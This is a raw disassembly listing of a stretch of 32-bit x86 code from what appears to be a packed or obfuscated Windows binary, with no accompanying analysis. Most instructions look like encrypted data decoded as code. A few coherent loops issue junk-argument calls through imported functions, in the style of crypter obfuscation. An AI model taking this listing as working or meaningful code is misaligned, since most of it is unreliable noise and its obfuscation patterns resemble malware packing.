  409e0f:	xor    BYTE PTR [edi-0x7b],0x41
  409e13:	xchg   DWORD PTR [edi+0x19],eax
  409e16:	mov    ds:0x2a08054a,al
  409e1b:	xchg   edx,eax
  409e1c:	pop    ebp
  409e1d:	pop    ecx
  409e1e:	adc    DWORD PTR [ecx-0x28],esp
  409e21:	jns    0x409e9c
  409e23:	out    0xd6,al
  409e25:	les    edx,FWORD PTR [ebx-0x7c1bee55]
  409e2b:	hlt    
  409e2c:	jbe    0x409ded
  409e2e:	cmp    al,0x7a
  409e30:	or     eax,0x3c4cc170
  409e35:	call   0xcef3:0xc5c64fb3
  409e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e3d:	inc    eax
  409e3e:	sub    eax,0x2c59255b
  409e43:	adc    dl,cl
  409e45:	push   esi
  409e46:	ror    DWORD PTR [esi],1
  409e48:	adc    DWORD PTR [edx-0x571a6a43],eax
  409e4e:	(bad)  
  409e4f:	cmp    DWORD PTR [esi-0x26],edx
  409e52:	pop    esi
  409e53:	mov    ebp,DWORD PTR [edi+0x73d3e38e]
  409e59:	inc    edx
  409e5a:	rol    esi,0x28
  409e5d:	nop
  409e5e:	int    0x74
  409e60:	push   ds
  409e61:	int3   
  409e62:	jecxz  0x409ead
  409e64:	retf   0x86e
  409e67:	inc    ecx
  409e68:	mov    eax,ds:0x24e25c45
  409e6d:	enter  0xdb37,0x55
  409e71:	(bad)  
  409e72:	repnz mov cl,BYTE PTR [ebp+0x43]
  409e76:	sub    bh,al
  409e78:	pushf  
  409e79:	stos   BYTE PTR es:[edi],al
  409e7a:	(bad)  
  409e7b:	adc    al,0x5c
  409e7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e7e:	mov    BYTE PTR [edi+0x73c1de8],ch
  409e84:	mov    ebx,0x35b6dd4f
  409e89:	cmp    ebp,DWORD PTR [eax-0x42]
  409e8c:	out    0x3,eax
  409e8e:	jns    0x409e68
  409e90:	jbe    0x409e47
  409e92:	adc    cl,BYTE PTR [ebp-0x54]
  409e95:	sub    eax,0x95397022
  409e9a:	retf   
  409e9b:	adc    al,0x4c
  409e9d:	or     edx,eax
  409e9f:	popa   
  409ea0:	out    0xc9,eax
  409ea2:	fstp   DWORD PTR ds:0xe148863d
  409ea8:	aas    
  409ea9:	and    BYTE PTR [ebx-0x3b],cl
  409eac:	mov    bl,BYTE PTR [ebx+0x4e]
  409eaf:	push   edi
  409eb0:	enter  0xfce6,0x64
  409eb4:	test   DWORD PTR [ebx],ecx
  409eb6:	pop    esp
  409eb7:	pop    esi
  409eb8:	mov    al,0xbd
  409eba:	scas   al,BYTE PTR es:[edi]
  409ebb:	cmp    BYTE PTR [ebx+0x71f25864],al
  409ec1:	mov    edi,DWORD PTR [ebp+eiz*4-0xa796986]
  409ec8:	pop    esi
  409ec9:	call   0x2cc70f00
  409ece:	lods   eax,DWORD PTR ds:[esi]
  409ecf:	mov    dh,BYTE PTR [ebp+0x12]
  409ed2:	adc    ecx,DWORD PTR [edx-0xa]
  409ed5:	(bad)  
  409ed6:	sbb    ecx,DWORD PTR [edi+0x6bf8eb56]
  409edc:	mov    bl,0x85
  409ede:	or     bl,ah
  409ee0:	retf   0x56b4
  409ee3:	pop    ebx
  409ee4:	mov    eax,ebp
  409ee6:	aas    
  409ee7:	dec    esi
  409ee8:	aam    0x5a
  409eea:	and    BYTE PTR [edx],bl
  409eec:	out    dx,eax
  409eed:	icebp  
  409eee:	idiv   DWORD PTR [ecx-0x2]
  409ef1:	(bad)
  409ef5:	sub    ch,dh
  409ef7:	je     0x409efd
  409ef9:	sub    al,0x5d
  409efb:	push   ebp
  409efc:	adc    ebx,DWORD PTR ds:0x87f4c5d9
  409f02:	mov    eax,ds:0x6efe29e7
  409f07:	xchg   esp,eax
  409f08:	dec    esi
  409f09:	mov    fs,WORD PTR [edi+0x59b5eb68]
  409f0f:	sub    ch,BYTE PTR [eax]
  409f11:	shl    BYTE PTR [edi+eiz*8],0x33
  409f15:	outs   dx,DWORD PTR ds:[esi]
  409f16:	mov    al,0x62
  409f18:	aam    0x29
  409f1a:	shl    DWORD PTR [edi],1
  409f1c:	fnstsw WORD PTR [ebx+0x24]
  409f1f:	jp     0x409f2d
  409f21:	es loop 0x409f16
  409f24:	jno    0x409f86
  409f26:	jmp    0x409ef0
  409f28:	shr    BYTE PTR [edx-0x45],1
  409f2b:	xor    BYTE PTR [edx+0x18],0xfd
  409f2f:	dec    ebx
  409f30:	and    ecx,DWORD PTR [eax+0x382c4b99]
  409f36:	in     eax,0x1e
  409f38:	mov    ds:0x8326fcd,eax
  409f3d:	inc    esi
  409f3e:	and    BYTE PTR [ecx-0x2b],bl
  409f41:	mov    al,ds:0x8f070f67
  409f46:	jg     0x409f09
  409f48:	out    0x0,al
  409f4a:	push   edx
  409f4b:	jp     0x409fab
  409f4d:	shr    DWORD PTR ds:0xcb3e2f1,cl
  409f53:	mov    BYTE PTR [edx-0x50],0xc3
  409f57:	leave  
  409f58:	popa   
  409f59:	aad    0x34
  409f5b:	outs   dx,BYTE PTR ds:[esi]
  409f5c:	cs mov ebx,0x9421cda6
  409f62:	rcl    cl,0x8
  409f65:	mov    ecx,0xe67ba378
  409f6a:	xor    al,cl
  409f6c:	fist   WORD PTR ds:0xc620239d
  409f72:	or     DWORD PTR [esp+edi*1+0x3e13eacf],ebp
  409f79:	mov    al,0x8a
  409f7b:	sbb    ebp,DWORD PTR [eax+0x566ed525]
  409f81:	test   al,0xcd
  409f83:	imul   ecx,DWORD PTR [edx+eax*2+0x68a3a417],0xffffffe1
  409f8b:	jae    0x409f37
  409f8d:	das    
  409f8e:	shl    BYTE PTR [ecx],0x74
  409f91:	jns    0x409f45
  409f93:	fidivr WORD PTR [ebp-0x6ec9754d]
  409f99:	test   al,0x80
  409f9b:	lods   al,BYTE PTR ds:[esi]
  409f9c:	xor    eax,0xd2bb90ec
  409fa1:	jge    0x409f33
  409fa3:	pop    ds
  409fa4:	(bad)  
  409fa5:	mov    ds:0xdad14017,al
  409faa:	dec    ebp
  409fab:	pop    ss
  409fac:	pop    edx
  409fad:	ja     0x409ff6
  409faf:	sbb    ebx,DWORD PTR [ebp+0x20]
  409fb2:	popa   
  409fb3:	xchg   DWORD PTR [eax],edi
  409fb5:	sbb    BYTE PTR [ebx-0x29085202],dl
  409fbb:	mov    esi,DWORD PTR [edi-0x1c1b0200]
  409fc1:	xor    dh,BYTE PTR [ebx+0x38]
  409fc4:	cmp    eax,0xc257edbf
  409fc9:	sub    eax,0x16520365
  409fce:	mov    ecx,esp
  409fd0:	ret    
  409fd1:	xchg   esp,eax
  409fd2:	pcmpeqw mm7,QWORD PTR [ebx]
  409fd5:	out    dx,al
  409fd6:	loope  0x40a031
  409fd8:	lahf   
  409fd9:	popa   
  409fda:	sub    eax,0xe2f30036
  409fdf:	jbe    0x40a01d
  409fe1:	retf   0xe463
  409fe4:	fstp   DWORD PTR [edx-0x27c19bd7]
  409fea:	push   ebp
  409feb:	xchg   esp,eax
  409fec:	sahf   
  409fed:	gs int 0xe0
  409ff0:	sub    DWORD PTR ds:0xe8af9d5d,esi
  409ff6:	ret    
  409ff7:	mov    bh,0xf3
  409ff9:	fsub   QWORD PTR ds:0x913f81fb
  409fff:	inc    ecx
  40a000:	xchg   edi,eax
  40a001:	mov    bh,0x37
  40a003:	jmp    0x1d97:0x7eca0fe6
  40a00a:	jge    0x409ffc
  40a00c:	data16 jno 0x40a072
  40a00f:	mov    ebx,0xb9d0af0f
  40a014:	jae    0x40a05b
  40a016:	add    BYTE PTR [eax],al
  40a018:	mov    edi,DWORD PTR ds:0x4336d3
  40a01e:	sbb    DWORD PTR ds:0x43360f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433663,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433623
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43365b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43365b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43365b,ecx
  40a059:	cmp    DWORD PTR ds:0x43365b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43383e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43365b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43360b,0x11
  40a090:	cmp    DWORD PTR ds:0x43360b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43360b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43360b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43360b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43360b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43360b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43360b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433603,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43366f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433613
  40a0ff:	mov    DWORD PTR ds:0x43366f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433667,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	aas    
  40a127:	repz cwde 
  40a129:	mov    esp,0x7e7ee082
  40a12e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a132:	adc    BYTE PTR [ebx-0x1f],dl
  40a135:	arpl   WORD PTR [eax],dx
  40a137:	cmp    al,0x14
  40a139:	push   ss
  40a13a:	aaa    
  40a13b:	nop
  40a13c:	push   esi
  40a13d:	jne    0x40a10b
  40a13f:	lods   al,BYTE PTR ds:[esi]
  40a140:	stc    
  40a141:	inc    esp
  40a142:	cmp    eax,0xd3dce648
  40a147:	bound  edx,QWORD PTR [eax+eiz*2+0x6cf20bef]
  40a14e:	leave  
  40a14f:	pop    ebp
  40a150:	push   0x23
  40a152:	add    BYTE PTR [esi+0x739f5f60],cl
  40a158:	out    dx,al
  40a159:	fst    DWORD PTR [ebx+0x71fc9a99]
  40a15f:	push   esp
  40a160:	and    bl,BYTE PTR [eax+0x7a741128]
  40a166:	pushf  
  40a167:	(bad)  
  40a168:	sub    eax,DWORD PTR [ebp+0x6d7563f1]
  40a16e:	js     0x40a1cb
  40a170:	in     al,dx
  40a171:	mov    al,ds:0x1738b391
  40a176:	xchg   ebx,eax
  40a177:	push   ds
  40a178:	xor    BYTE PTR [edx-0x1443f506],cl
  40a17e:	idiv   bh
  40a180:	cmp    BYTE PTR [edx+0x4b86e821],al
  40a186:	fwait
  40a187:	adc    DWORD PTR [ecx-0x2c],ecx
  40a18a:	sahf   
  40a18b:	mov    esp,0x4f2051dc
  40a190:	xchg   ecx,eax
  40a191:	mov    cl,BYTE PTR [ebx-0x11]
  40a194:	int    0x54
  40a196:	sub    BYTE PTR [esi-0x7b8d8b6c],dh
  40a19c:	xchg   BYTE PTR [eax+ebp*4+0x5553c830],dl
  40a1a3:	mov    bl,0x95
  40a1a5:	mov    ds:0x31d4d776,eax
  40a1aa:	dec    ecx
  40a1ab:	mov    ds:0xc27fe740,al
  40a1b0:	xchg   DWORD PTR [esi+0x32],esi
  40a1b3:	lods   eax,DWORD PTR ds:[esi]
  40a1b4:	mov    ebx,0xb6bbf48e
  40a1b9:	fabs   
  40a1bb:	cdq    
  40a1bc:	ror    BYTE PTR [edx+eiz*1+0x1371b2c5],cl
  40a1c3:	call   0x6626:0xf2b4f942
  40a1ca:	pop    es
  40a1cb:	mov    eax,ds:0xad4cde72
  40a1d0:	imul   edi,DWORD PTR [edi+0x1b],0x59534afc
  40a1d7:	pop    esp
  40a1d8:	cld    
  40a1d9:	loop   0x40a1cb
  40a1db:	out    dx,eax
  40a1dc:	lea    esp,[ebx+0x5402156c]
  40a1e2:	or     ch,ah
  40a1e4:	ret    
  40a1e5:	ds lods eax,DWORD PTR gs:[esi]
  40a1e8:	aas    
  40a1e9:	mov    ebp,0x1ef79cac
  40a1ee:	out    0x30,al
  40a1f0:	dec    esp
  40a1f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1f2:	push   cs
  40a1f3:	fcom   st(2)
  40a1f5:	sbb    eax,0xf2e391ee
  40a1fa:	cmp    BYTE PTR [ebp-0x41f2751c],dl
  40a200:	adc    al,0x39
  40a202:	jnp    0x40a1a6
  40a204:	and    DWORD PTR [edi-0x359fe33f],edx
  40a20a:	xchg   ecx,eax
  40a20b:	dec    eax
  40a20c:	pusha  
  40a20d:	es in  al,0x9c
  40a210:	sbb    esp,DWORD PTR [esi]
  40a212:	xchg   DWORD PTR gs:[edi-0x67],esi
  40a216:	in     eax,dx
  40a217:	dec    esi
  40a218:	push   ebx
  40a219:	mov    ecx,0xf63e4faa
  40a21e:	jmp    0x94d9b33b
  40a223:	push   eax
  40a224:	lock iret 
  40a226:	outs   dx,DWORD PTR ds:[esi]
  40a227:	in     al,dx
  40a228:	ds repz je 0x40a1ea
  40a22c:	sahf   
  40a22d:	mov    ah,0x7a
  40a22f:	mov    bl,cl
  40a231:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a233:	test   eax,0xb6799f41
  40a238:	popf   
  40a239:	dec    edi
  40a23a:	dec    esp
  40a23b:	adc    DWORD PTR [esi],ebp
  40a23d:	jecxz  0x40a24d
  40a23f:	mov    ch,0xf5
  40a241:	xchg   esi,eax
  40a242:	stos   BYTE PTR es:[edi],al
  40a243:	int    0xbf
  40a245:	mov    ebp,0xff743842
  40a24a:	jne    0x40a2b1
  40a24c:	push   ds
  40a24d:	mov    edx,0xc6cd5ea8
  40a252:	push   ebp
  40a253:	mov    edi,fs
  40a255:	push   0x108e352f
  40a25a:	xor    DWORD PTR ss:[ebx],edx
  40a25d:	xor    eax,0x47e8fbc3
  40a262:	ins    BYTE PTR es:[edi],dx
  40a263:	sbb    edi,DWORD PTR ss:[edx-0xcc21f49]
  40a26a:	adc    ebp,DWORD PTR [eax-0x7a]
  40a26d:	sub    edi,DWORD PTR [ebx]
  40a26f:	adc    eax,0x638be877
  40a274:	test   DWORD PTR [edx-0x27],eax
  40a277:	lahf   
  40a278:	scas   al,BYTE PTR es:[edi]
  40a279:	lods   al,BYTE PTR ds:[esi]
  40a27a:	adc    al,cl
  40a27c:	mov    dh,0x17
  40a27e:	or     BYTE PTR [ebx],0x3c
  40a281:	das    
  40a282:	test   eax,0xf7ed1d8a
  40a287:	fistp  WORD PTR [ecx]
  40a289:	adc    eax,0x1f7b9006
  40a28e:	ins    DWORD PTR es:[edi],dx
  40a28f:	outs   dx,DWORD PTR ds:[esi]
  40a290:	inc    ebp
  40a291:	jmp    0x40a2af
  40a293:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a294:	xchg   esp,eax
  40a295:	and    DWORD PTR [edx-0x11],eax
  40a298:	aad    0xec
  40a29a:	cwde   
  40a29b:	xchg   DWORD PTR [ecx],ebx
  40a29d:	popf   
  40a29e:	inc    esi
  40a29f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2a0:	ret    
  40a2a1:	sti    
  40a2a2:	lds    ecx,FWORD PTR [eax+0x22c69e6]
  40a2a8:	call   0xfb5b6978
  40a2ad:	fnstenv [ebx-0x3b0ec35f]
  40a2b3:	mov    ebp,0x6f3a0e47
  40a2b8:	popf   
  40a2b9:	jmp    0xff2dd7cc
  40a2be:	das    
  40a2bf:	std    
  40a2c0:	xlat   BYTE PTR ds:[ebx]
  40a2c1:	add    eax,ebp
  40a2c3:	clc    
  40a2c4:	popf   
  40a2c5:	aaa    
  40a2c6:	mov    dh,bl
  40a2c8:	inc    edx
  40a2c9:	mov    edi,0xe64d2dc7
  40a2ce:	sbb    esp,ecx
  40a2d0:	and    ebp,DWORD PTR [ebx]
  40a2d2:	jmp    0x2b04be
  40a2d7:	(bad)  
  40a2d8:	mov    ah,0x34
  40a2da:	enter  0x4877,0xe4
  40a2de:	ficomp DWORD PTR [edx+0x22]
  40a2e1:	sbb    bl,BYTE PTR [edx+0x5cffb3bb]
  40a2e7:	push   ebx
  40a2e8:	sub    eax,0x186d4ebc
  40a2ed:	stc    
  40a2ee:	into   
  40a2ef:	push   ecx
  40a2f0:	test   BYTE PTR [edx-0x5e],bh
  40a2f3:	fstp   DWORD PTR ds:0x39dfd2ec
  40a2f9:	mov    al,ds:0x4d803f4e
  40a2fe:	jnp    0x40a328
  40a300:	push   esi
  40a301:	jmp    0x1a4090fb
  40a306:	aas    
  40a307:	fnstsw WORD PTR [ecx]
  40a309:	inc    edi
  40a30a:	adc    BYTE PTR [eax-0x12],bl
  40a30d:	jmp    0x35c4:0xef3709e8
  40a314:	lock (bad) 
  40a316:	cli    
  40a317:	fadd   QWORD PTR [eax-0x5c45dc0e]
  40a31d:	push   ebp
  40a31e:	ja     0x40a2c9
  40a320:	xchg   esi,eax
  40a321:	inc    ecx
  40a322:	in     eax,dx
  40a323:	out    0x78,eax
  40a325:	inc    esp
  40a326:	mov    ?,WORD PTR [eax]
  40a328:	dec    eax
  40a329:	push   ebp
  40a32a:	jp     0x40a3a2
  40a32c:	dec    ebx
  40a32d:	mov    ah,0x82
  40a32f:	frstor ds:0x6a7d0374
  40a335:	out    dx,al
  40a336:	jp     0x40a39b
  40a338:	xchg   ecx,eax
  40a339:	xchg   esi,eax
  40a33a:	sub    DWORD PTR ds:0x58e243cd,esp
  40a340:	or     esi,DWORD PTR [eax+0x24]
  40a343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a344:	bound  ecx,QWORD PTR [ebp-0x13d24a6e]
  40a34a:	stos   DWORD PTR es:[edi],eax
  40a34b:	lea    eax,[eax+ecx*1-0x4f]
  40a34f:	lahf   
  40a350:	rcr    DWORD PTR [edx-0x78],cl
  40a353:	into   
  40a354:	test   BYTE PTR [edi+ebp*8+0x2c],al
  40a358:	fwait
  40a359:	push   es
  40a35a:	or     al,0xf
  40a35c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a35d:	aas    
  40a35e:	and    eax,DWORD PTR [ecx+0x54753b46]
  40a364:	mov    al,ds:0xe6149ce7
  40a369:	rcr    BYTE PTR [ecx-0x7b],0x68
  40a36d:	xchg   BYTE PTR [ecx+0x3f],al
  40a370:	repnz popa 
  40a372:	add    eax,0x90610086
  40a377:	icebp  
  40a378:	mov    ecx,DWORD PTR [ebp-0x18]
  40a37b:	xor    ecx,eax
  40a37d:	and    DWORD PTR ds:0x4335fb,0x0
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x4335fb
  40a394:	inc    eax
  40a395:	mov    ds:0x4335fb,eax
  40a39a:	cmp    DWORD PTR ds:0x4335fb,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4335fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4336ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43366b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433667,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433667,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433667,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433697
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433667,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433667
  40a434:	dec    eax
  40a435:	mov    ds:0x433667,eax
  40a43a:	mov    eax,ds:0x433667
  40a43f:	dec    eax
  40a440:	mov    ds:0x433667,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43361f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43372f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433723,0x4336a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433607,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	ret    
  40a49c:	dec    esp
  40a49d:	or     al,0x80
  40a49f:	dec    esp
  40a4a0:	out    dx,al
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	in     al,dx
  40a4a8:	inc    edi
  40a4a9:	push   ss
  40a4aa:	xor    cl,al
  40a4ac:	int3   
  40a4ad:	jns    0x40a458
  40a4af:	aam    0x15
  40a4b1:	sub    BYTE PTR [edi-0x7c],dl
  40a4b4:	(bad)  [ebx-0x7c05e2f3]
  40a4ba:	dec    ebx
  40a4bb:	pushf  
  40a4bc:	rcl    cl,1
  40a4be:	pop    ecx
  40a4bf:	dec    ecx
  40a4c0:	test   al,0x17
  40a4c2:	dec    esi
  40a4c3:	int3   
  40a4c4:	sub    ebx,DWORD PTR [ecx+0x70]
  40a4c7:	aam    0x2b
  40a4c9:	xchg   edi,eax
  40a4ca:	outs   dx,BYTE PTR ds:[esi]
  40a4cb:	mov    bl,0x6f
  40a4cd:	jmp    0x40a4a1
  40a4cf:	add    ah,BYTE PTR [edi-0x432033a6]
  40a4d5:	int    0x1e
  40a4d7:	retf   
  40a4d8:	sbb    eax,DWORD PTR [ebp+0x1e56e44]
  40a4de:	dec    ebx
  40a4df:	jp     0x40a47e
  40a4e1:	or     edi,eax
  40a4e3:	dec    edx
  40a4e4:	and    eax,DWORD PTR [edx+edx*4-0x1d]
  40a4e8:	dec    esi
  40a4e9:	xchg   esp,eax
  40a4ea:	out    0x5f,al
  40a4ec:	stos   DWORD PTR es:[edi],eax
  40a4ed:	retf   
  40a4ee:	xchg   ebp,eax
  40a4ef:	div    ah
  40a4f1:	jo     0x40a538
  40a4f3:	int    0xba
  40a4f5:	pop    eax
  40a4f6:	popf   
  40a4f7:	adc    DWORD PTR [edx],edx
  40a4f9:	pop    esi
  40a4fa:	dec    edx
  40a4fb:	add    ebx,DWORD PTR [edi+esi*1+0x10d424bb]
  40a502:	and    esi,0xfffffff5
  40a505:	test   eax,0x90eb7ad2
  40a50a:	pop    edx
  40a50b:	pop    ebp
  40a50c:	jo     0x40a48e
  40a50e:	add    eax,DWORD PTR [ebx]
  40a510:	jmp    0x40a4e4
  40a512:	xlat   BYTE PTR ds:[ebx]
  40a513:	imul   esp,esi,0x52d0df5a
  40a519:	cmp    eax,0xed9ed773
  40a51e:	push   edx
  40a51f:	pushf  
  40a520:	imul   ebp,DWORD PTR [edx],0x29b7d045
  40a526:	ret    
  40a527:	jg     0x40a4d6
  40a529:	inc    esi
  40a52a:	ret    
  40a52b:	adc    DWORD PTR [esi],edx
  40a52d:	ret    
  40a52e:	into   
  40a52f:	cmp    edi,DWORD PTR [eax-0x75ff029e]
  40a535:	retf   
  40a536:	fisub  DWORD PTR [esi-0x4af7663f]
  40a53c:	adc    DWORD PTR [ecx],esi
  40a53e:	dec    edx
  40a53f:	idiv   esi
  40a541:	jmp    0x40a562
  40a543:	push   ebx
  40a544:	bound  ebp,QWORD PTR [edx+ebx*8]
  40a547:	sub    DWORD PTR [esi+0x136c6425],0xffffff94
  40a54e:	push   esp
  40a54f:	leave  
  40a550:	cmp    ah,bh
  40a552:	push   0x46
  40a554:	add    eax,esp
  40a556:	sahf   
  40a557:	cli    
  40a558:	aam    0x7e
  40a55a:	xchg   edi,eax
  40a55b:	xor    DWORD PTR [eax],esi
  40a55d:	fwait
  40a55e:	adc    eax,0x728ea766
  40a563:	clc    
  40a564:	jbe    0x40a58c
  40a566:	add    edi,DWORD PTR [ecx]
  40a568:	out    0x82,al
  40a56a:	inc    edx
  40a56b:	lds    edx,FWORD PTR [ecx]
  40a56d:	xchg   edx,eax
  40a56e:	test   DWORD PTR [edx],0x1eb25260
  40a574:	sbb    ecx,0x31
  40a577:	daa    
  40a578:	lods   al,BYTE PTR ds:[esi]
  40a579:	push   cs
  40a57a:	loope  0x40a571
  40a57c:	pop    es
  40a57d:	sbb    dl,ch
  40a57f:	aad    0xd1
  40a581:	stos   BYTE PTR es:[edi],al
  40a582:	and    BYTE PTR [ebx-0x33],dl
  40a585:	lea    eax,[edx-0x71]
  40a588:	fldcw  WORD PTR [esi+0x7a]
  40a58b:	ror    ah,0x43
  40a58e:	push   eax
  40a58f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a590:	(bad)  
  40a591:	(bad)  
  40a592:	pop    ebp
  40a593:	cmp    eax,0x8bf20127
  40a598:	inc    edi
  40a599:	jg     0x40a520
  40a59b:	mov    ds:0xa8e7a281,eax
  40a5a0:	dec    ecx
  40a5a1:	cs in  eax,0xed
  40a5a4:	inc    ecx
  40a5a5:	stos   BYTE PTR es:[edi],al
  40a5a6:	iret   
  40a5a7:	mov    edx,0xdbb5be88
  40a5ac:	pop    es
  40a5ad:	mov    esp,0x42c8f288
  40a5b2:	cmp    eax,0x3cf4affc
  40a5b7:	and    ecx,DWORD PTR [ebx]
  40a5b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5ba:	into   
  40a5bb:	and    eax,0x1d14d8ac
  40a5c0:	imul   edi,DWORD PTR [eax-0x4d],0xffffffda
  40a5c4:	mov    DWORD PTR [esi+edi*2-0x4cc81fdb],esp
  40a5cb:	out    0x8d,al
  40a5cd:	repnz icebp 
  40a5cf:	arpl   WORD PTR [esp+edx*2-0x2a],bx
  40a5d3:	sbb    DWORD PTR [edi-0xa],ebx
  40a5d6:	pop    ss
  40a5d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5d8:	int    0x87
  40a5da:	icebp  
  40a5db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5dc:	addr16 shl ebx,1
  40a5df:	add    bl,BYTE PTR [esi]
  40a5e1:	push   ecx
  40a5e2:	repnz sub BYTE PTR [ebx+0x1cb918be],0x98
  40a5ea:	sub    ebp,DWORD PTR [ecx-0x75]
  40a5ed:	push   ds
  40a5ee:	sbb    BYTE PTR [edx],al
  40a5f0:	leave  
  40a5f1:	mov    esp,0x12542ac6
  40a5f6:	popa   
  40a5f7:	mov    ch,0xc8
  40a5f9:	dec    edx
  40a5fa:	icebp  
  40a5fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5fc:	pop    ebp
  40a5fd:	cmp    BYTE PTR [ebx],bh
  40a5ff:	out    0x32,al
  40a601:	test   eax,0xd2fd6c69
  40a606:	jl     0x40a67f
  40a608:	add    esi,0x5756a1e5
  40a60e:	sbb    dh,BYTE PTR [ebx-0x50]
  40a611:	sub    al,0x83
  40a613:	mov    eax,0xdb83c2f1
  40a618:	pop    eax
  40a619:	sub    DWORD PTR [ecx],0x43c9a6bf
  40a61f:	inc    edi
  40a620:	ins    DWORD PTR es:[edi],dx
  40a621:	and    esp,DWORD PTR [edx-0x12]
  40a624:	sub    cl,BYTE PTR [eax]
  40a626:	test   ecx,ebx
  40a628:	xchg   edi,eax
  40a629:	dec    eax
  40a62a:	iret   
  40a62b:	inc    ebp
  40a62c:	mov    edi,0xf3508ecd
  40a631:	add    al,0x2c
  40a633:	arpl   WORD PTR [esi],cx
  40a635:	frstor [esi]
  40a637:	(bad)  
  40a638:	out    0xec,eax
  40a63a:	lea    ebx,[eax]
  40a63c:	cmc    
  40a63d:	sub    DWORD PTR [esi],ebp
  40a63f:	sti    
  40a640:	imul   ebx,DWORD PTR [edx],0xffffffc1
  40a643:	inc    DWORD PTR [eax]
  40a645:	inc    eax
  40a646:	pop    es
  40a647:	jno    0x40a695
  40a649:	js     0x40a68b
  40a64b:	fist   WORD PTR ds:0xbc718779
  40a651:	call   0x232091d7
  40a656:	leave  
  40a657:	cld    
  40a658:	dec    esi
  40a659:	jmp    0xfb56:0xb145ea7c
  40a660:	pop    ecx
  40a661:	lahf   
  40a662:	xchg   ebx,eax
